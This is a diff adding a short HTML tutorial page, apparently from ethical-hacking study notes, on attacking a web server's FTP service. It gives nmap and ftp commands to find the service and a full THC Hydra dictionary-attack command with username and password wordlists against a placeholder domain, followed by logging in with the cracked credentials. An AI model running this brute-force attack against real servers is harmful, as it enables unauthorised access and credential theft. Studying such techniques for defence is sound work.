@@ -1,0 +1,18 @@
+    <meta name=”robots” content=”noindex,nofollow”/>
+  <a href=../index.html>Back to home</a>
+<hr/>
+<h1>Web Server Attack</h1>
+<p>After gathering required information about the target web server, the next task is to attack the web server.</p>
+  <h2>Crack FTP credentials using a Dictionary Attack</h2>
+  <p><ol>
+    <ul>Find open FTP port with nmap</ul>
+    <ul>sudo nmap -p21 domain.tld</ul>
+    <ul>If port 21 is open, check if an FTP server is hosted on the machine</ul>
+    <ul>ftp domain.tld</ul>
+    <ul>The need for credentials implies that an FTP server is hosted on the machine</ul>
+    <ul>Guess some usernames and passwords</ul>
+    <ul>Next, attempt to gain access to the FTP server performing a dictionary attack with <a target=_blank href=https://github.com/vanhauser-thc/thc-hydra>THC Hydra</a></ul>
+    <ul>sudo hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://domain.tld</ul>
+    <ul>Hydra tries various combinations of usernames and passwords present in the Wordlists</ul>
+    <ul>On completion of the password cracking, the <b>cracked credentials</b> appear; try to log in to the FTP server using one of the cracked username and password combinations</ul>
+  </ol>
